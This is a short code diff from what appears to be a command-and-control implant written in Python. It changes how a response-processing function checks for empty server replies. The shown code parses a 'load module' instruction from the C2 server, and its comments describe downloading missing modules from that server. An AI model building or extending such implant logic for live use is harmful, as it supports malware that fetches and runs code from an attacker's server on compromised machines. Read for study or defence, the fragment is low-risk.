@@ -49,7 +49,7 @@ def get_computer_and_username():
 
 def process_response(post_object):
     """This function takes the response from the server and processes it"""
-    if not post_object:
+    if post_object != '""':
         if len(post_object.split()) == 3 and post_object.split()[0] == 'load' and post_object.split()[1] == 'module':
             # C2 is asking to load a module, so we will check if the module is
             # on disk or not, if not then we will download it from the server
